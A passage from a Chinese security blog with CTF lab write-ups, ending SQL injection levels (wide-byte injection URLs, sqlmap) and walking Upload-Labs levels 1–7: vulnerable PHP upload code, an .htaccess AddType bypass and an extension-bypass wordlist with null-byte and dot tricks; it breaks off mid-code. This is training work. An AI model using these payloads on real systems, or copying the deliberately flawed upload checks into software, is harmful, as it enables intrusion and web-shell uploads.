<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725171952143.png" alt="image-20210725171952143"></p>
<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">@$sql = <span class="string">'select *from user where id=("'</span>.$id.<span class="string">'")'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">mysqli_query($conn,<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>和上题区别不大，就是加了“)的形式</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-16/index.php?id=1%df") union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">'select *from user where username =(\''</span>.$username.<span class="string">'\') and password=(\''</span>.$password.<span class="string">'\')'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">mysqli_query($conn,<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>这题是个盲注，但是我还是说一下，post传参由于没有url解码，所以宽字节注入得换个参数，比如“汉”这个字和右下划线组成一个汉字也是可以逃逸的。</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>成功逃逸</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725172842136.png" alt="image-20210725172842136"></p>
<ul>
<li><strong>因为是盲注所以嘿嘿，抓包，存123.txt，注意：一定要抓我们自己成功构造登陆的形式加*来让sqlmap跑，不然可能跑不出来</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725173245278.png" alt="image-20210725173245278"></p>
<ul>
<li>sqlmap跑的形式</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725173306539.png" alt="image-20210725173306539"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725173317389.png" alt="image-20210725173317389"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725174439030.png" alt="image-20210725174439030"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>SQL注入</tag>
        <tag>黑客工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】Upload-Labs wp</title>
    <url>/2021/07/21/%E3%80%90%E5%B0%81%E7%A5%9E%E5%8F%B0%E3%80%91Upload-Labs%20wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场upload-labs，练练手！</li>
<li>环境：<a href="http://59.63.200.79:8016/" target="_blank" rel="noopener">http://59.63.200.79:8016/</a></li>
</ul>
</blockquote>
<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>没有对文件进行限制抓包改，需要注意一点的就是图片马多生成几个试吧，有的图片不太行</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210721181216739.png" alt="image-20210721181216739"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210721182048669.png" alt="image-20210721182048669"></p>
</blockquote>
<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>只限制了content-type，并没有限制你改后缀名，和上题一样做法</strong></li>
</ul>
</blockquote>
<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了几个，可以用其他试试phtml、php3、php.a、shtml，提示：如果是asp的就可以用cer、asa、cdx等</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210721182725944.png" alt="image-20210721182725944"></p>
<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>基本上都过滤了，用.htaccess文件绕过吧</strong></li>
<li><strong>这是解析漏洞 只有apache才有。</strong></li>
<li><strong>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。</strong></li>
<li><strong>提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</strong></li>
<li><strong>这个漏洞的原理就是服务器没有过滤htaccess文件的上传，而htaccess文件上传后，当前目录就会按照这个配置文件里面的内容执行。</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723070156817.png" alt="image-20210723070156817"></p>
<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了一堆，但是有的大小写没过滤完整，拿出字典看看，用PhP试试</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">phtml</span><br><span class="line">php</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">inc  </span><br><span class="line">pHtml</span><br><span class="line">pHp</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">iNc</span><br><span class="line">iNc%00</span><br><span class="line">iNc%20%20%20</span><br><span class="line">iNc%20%20%20...%20.%20..</span><br><span class="line">iNc......</span><br><span class="line">inc%00</span><br><span class="line">inc%20%20%20</span><br><span class="line">inc%20%20%20...%20.%20..</span><br><span class="line">inc......</span><br><span class="line">pHp%00</span><br><span class="line">pHp%20%20%20</span><br><span class="line">pHp%20%20%20...%20.%20..</span><br><span class="line">pHp......</span><br><span class="line">pHp3%00</span><br><span class="line">pHp3%20%20%20</span><br><span class="line">pHp3%20%20%20...%20.%20..</span><br><span class="line">pHp3......</span><br><span class="line">pHp4%00</span><br><span class="line">pHp4%20%20%20</span><br><span class="line">pHp4%20%20%20...%20.%20..</span><br><span class="line">pHp4......</span><br><span class="line">pHp5%00</span><br><span class="line">pHp5%20%20%20</span><br><span class="line">pHp5%20%20%20...%20.%20..</span><br><span class="line">pHp5......</span><br><span class="line">pHtml%00</span><br><span class="line">pHtml%20%20%20</span><br><span class="line">pHtml%20%20%20...%20.%20..</span><br><span class="line">pHtml......</span><br><span class="line">php%00</span><br><span class="line">php%20%20%20</span><br><span class="line">php%20%20%20...%20.%20..</span><br><span class="line">php......</span><br><span class="line">php3%00</span><br><span class="line">php3%20%20%20</span><br><span class="line">php3%20%20%20...%20.%20..</span><br><span class="line">php3......</span><br><span class="line">php4%00</span><br><span class="line">php4%20%20%20</span><br><span class="line">php4%20%20%20...%20.%20..</span><br><span class="line">php4......</span><br><span class="line">php5%00</span><br><span class="line">php5%20%20%20</span><br><span class="line">php5%20%20%20...%20.%20..</span><br><span class="line">php5......</span><br><span class="line">phtml%00</span><br><span class="line">phtml%20%20%20</span><br><span class="line">phtml%20%20%20...%20.%20..</span><br><span class="line">phtml......</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723064040610.png" alt="image-20210723064040610"></p>
<h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤的比较全面就是没有去空格的函数，提示也说了空格绕过</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723064311661.png" alt="image-20210723064311661"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723064347289.png" alt="image-20210723064347289"></p>
<h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span 